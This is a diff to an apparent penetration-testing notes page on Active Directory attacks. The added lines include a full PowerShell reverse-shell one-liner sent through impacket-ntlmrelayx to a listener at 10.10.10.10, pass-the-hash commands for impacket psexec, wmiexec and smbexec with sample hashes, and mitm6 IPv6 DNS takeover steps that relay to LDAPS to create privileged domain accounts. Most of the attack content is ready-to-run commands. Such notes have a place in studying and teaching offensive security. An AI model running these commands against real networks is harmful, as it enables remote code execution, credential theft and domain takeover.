@@ -19,7 +19,7 @@ Example:
 
 Victim and Server
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 ### How to exploit
 
@@ -128,14 +128,24 @@ impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe
 
 Execute a command:
 
-```
-impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
-```
+<pre><code><strong>impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"</strong></code></pre>
 
 You can also use a PowerShell Reverse Shell!
 
+Start nc listener:
+
 ```
+nc -lnvp 80
 ```
+
+NTLMRELAYX:
+
+```
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+* Be sure to change the IP/port as needed!
+* If it does not work, check firewall rules
 
 ## Identifying and Discovering Hosts w/ SMB Signing Disabled
 
@@ -150,3 +160,108 @@ nmap --script=smb2-security-mode.nse -p445 192.168.10.0/24
 ```
 
 * Upon running responder and obtaining a network event, you will get a hash
+
+## Gaining Shell Access
+
+* Here is where you need to start asking yourself "okay, we have credentials, how can we gain a shell?"
+* Be sure to ALWAYS try and use multiple options before giving up!!!!
+* First, attempt to use <mark style="color:yellow;">SMBEXEC</mark> or <mark style="color:yellow;">WMIEXEC</mark> at first&#x20;
+
+### <mark style="color:yellow;">PSEXEC</mark>
+
+Pass-The-Hash:
+
+```
+impacket-psexec htb.local/Administrator@10.10.10.10 --hashes 823452073d75b9d1cf70ebdf86c7f98e
+```
+
+Execute Command Remotely:
+
+```
+impacket-psexec htb.local/Administrator -p Password123 cmd.exe
+```
+
+or
+
+```
+impacket-psexec htb.local/Administrator:Password123@10.10.10.10
+```
+
+### <mark style="color:yellow;">WMIEXEC</mark>
+
+Pass-The-Hash:
+
+```
+impacket-wmiexec htb.local/Administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:fb3b106896cdaa8a08072775fbd9afe9
+```
+
+### <mark style="color:yellow;">SMBEXEC</mark>
+
+Obtain a Shell:
+
+```
+impacket-smbexec htb.local/Administrator:Password123@10.10.10.10
+```
+
+## IPv6 Attacks
+
+* Know as Heath Adam's go-to attack!
+* Machines typically utilize IPv4
+* However, IPv6 is almost ALWAYS turned on
+* Odds are, nothing on the network is in charge of DNS for IPv6
+
+### How can we take advantage of this?
+
+* We can spoof the DNS server and appear as the DNS server
+  * We are now the DNS server
+* Send me all of the IPv6 traffic to me
+* <mark style="color:yellow;">When this happens, we can get authentication to the Domain Controller from SMB or LDAP</mark>
+* We can use that information to create a new machine
+* We can also perform LDAP relay with NTLM hashes and we can create an account using a tool known as <mark style="color:yellow;">ntlmrelayx</mark>
+
+## IPv6 DNS Takeover via MITM6
+
+### MITM6
+
+{% embed url="https://github.com/dirkjanm/mitm6" %}
+
+Step 1: Start MITM6
+
+```
+sudo mitm6 -d htb.local
+```
+
+Step 2: Set up a relay
+
+```
+impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh fakewpad.htb.local -l LOOTME
+```
+
+Step 3: Wait for a reboot or other event
+
+* Essentialy, IPv6 will send out a reply every 30 mins asking the network "who is my DNS server?"
+* <mark style="color:yellow;">Upon success, you will see that it is succeeding and sending loot to /LOOTME</mark>
+
+Step 4: CD into /LOOTME directory to obtain loot!
+
+* You can then utilize Firefox to read these HTML files!
+* Look for information such as descriptions and other things that are storing insecure cleartext passwords
+
+<mark style="color:yellow;">NOTE: If an Administrator logs in, it will create a new user with administrative privileges and we can own the domain! This is all done through an ACL. It can also be used to restore and revert the damage done with a .restore file!</mark>
+
+<mark style="color:yellow;">Not only can you add a new user, but a new computer!!!!! This is Delegation.</mark>
+
+### Reference
+
+{% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" %}
+
+## "Passback" Attacks
+
+* Stems from a bug that comes from a printer or some other strange device
+* Essentially, you are looking for a device that connects to LDAP or some kind of SMB connection
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Reference
+
+{% embed url="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack" %}
